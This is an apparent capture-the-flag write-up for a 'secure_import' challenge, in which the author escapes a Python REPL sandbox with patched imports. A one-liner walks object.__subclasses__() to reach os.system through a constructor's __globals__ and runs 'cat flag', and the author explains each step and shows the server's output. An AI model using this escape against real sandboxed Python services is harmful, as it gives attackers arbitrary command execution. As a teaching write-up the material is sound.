# secure_import

> Giving people Python REPLs is only bad since the ability to import unsafe modules is unsecure! Luckily, I patched the import mechanism and made it secure.  Here's my secure python REPL.

Provided: [`secure_import.py`](secure_import.py)

## Solution

I'd love to say my team came up with our final payload on our own, but then I'd be lying :)

In reality we just looked through [this website](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes) and found something that worked, which I tweaked a bit to make into this:

```python
[globals["os"].system for cls in ''.__class__.__base__.__subclasses__() if (globals := getattr(cls.__init__, "__globals__", None)) is not None and "os" in globals][0]("cat flag")
```

While I could probably just end my writeup here that'd be no fun, so let's dissect what that behemoth of a one-liner does, shall we? :)

### Explanation time

The first part of that payload is a list comprehension, which I'll break into multiple lines for readability:

```python
[globals["os"].system
  for cls in ''.__class__.__base__.__subclasses__() 
  if (globals := getattr(cls.__init__, "__globals__", None)) is not None 
  and "os" in globals]
```

First let's focus on what we're iterating over: `''.__class__.__base__.__subclasses__()`.
The first part, `''.__class__`, gives us the class of the string literal, which is just `str`:

```python
>>> ''.__class__
<class 'str'>
```

`''.__class__.__base__` then gives us the base class of `str`, which as it turns out is `object`:

```python
>>> ''.__class__.__base__
<class 'object'>
```

As it turns out, `object` is also the base class of every other class in Python 3, which is where the `__subclasses__()` method call comes in: it gives us all of the subclasses of `object`, which also happens to be every class that exists in Python :)

```python
# note: I couldn't get this working inside the secure-import repl, so this is just in vanilla Python 3.11.2
>>> len(''.__class__.__base__.__subclasses__())
218
```

So we're iterating over every class in existence, got it :)
Now onto the first if expression for filtering the classes:

```python
if (globals := getattr(cls.__init__, "__globals__", None)) is not None
```

This is where I deviated from the payload my team found on the website, since filtered out stuff that had "wrapper" in its name for a reason I didn't understand at the time.
There's also a lot happening in this one line, so let's again break it down further :)


`getattr` is one of the few whitelisted builtins that we still get, so this was my way of replicating `hasattr`, another builtin that wasn't whitelisted.
This basically checks if each class' constructor (`cls.__init__`) has the `__globals__` attribute, which as it turns out can contain useful stuff for breaking out of our sandbox :)
The third argument to `getattr` is the default value to return if the attribute isn't found, which is why the result of `getattr` is checked against `None`.
This whole check has to be done because otherwise you get an error like `'wrapper_descriptor' object has no attribute '__globals__'`, which explains why the original payload filtered out classes including "wrapper" in their name :)
Oh, and the `:=` (walrus) operator just allows you to assign to variables within an if expression.
You don't strictly have to use it, but it reduces repetition which is always nice :)

Now, onto the second part of the filtering:

```python
and "os" in globals
```

This is a bit more straightforward: it just checks if the globals of the class' constructor includes `os`, referring to [the module of the same name](https://docs.python.org/3/library/os.html).
The reason we check for `os` specifically is because of its [`system`](https://docs.python.org/3/library/os.html#os.system) function, which allows us to execute arbitrary commands to, say, read the flag from a file :)
This allows us to bypass the import system completely since the `os` module being imported into whatever class constructor's `__globals__` happens before the import patches :)

The first line of the line comprehension just extracts the `os.system()` function for easy access.

With all of that in mind, the rest of the payload is fairly straightforward. We get the first reference to the `os.system()` function, then call it with `cat flag` as the command to run.
Let's try running it against the server:

```python
Welcome to Secure REPL!
Ctrl+C to exit.
>>> [globals["os"].system for cls in ''.__class__.__base__.__subclasses__() if (globals := getattr(cls.__init__, "__globals__", None)) is not None and "os" in globals][0]("cat flag")
osu{maybe_we_should_just_not_have_python_repl_as_a_service}0
```

And there's our flag! The extra 0 at the end is just the status code of running `cat flag`, since that's what `os.system` returns.
A status code of 0 means that nothing went wrong in case you didn't know :)
But yeah, I guess trying to secure Python's import system is kinda difficult since you can just kinda bypass it entirely :)
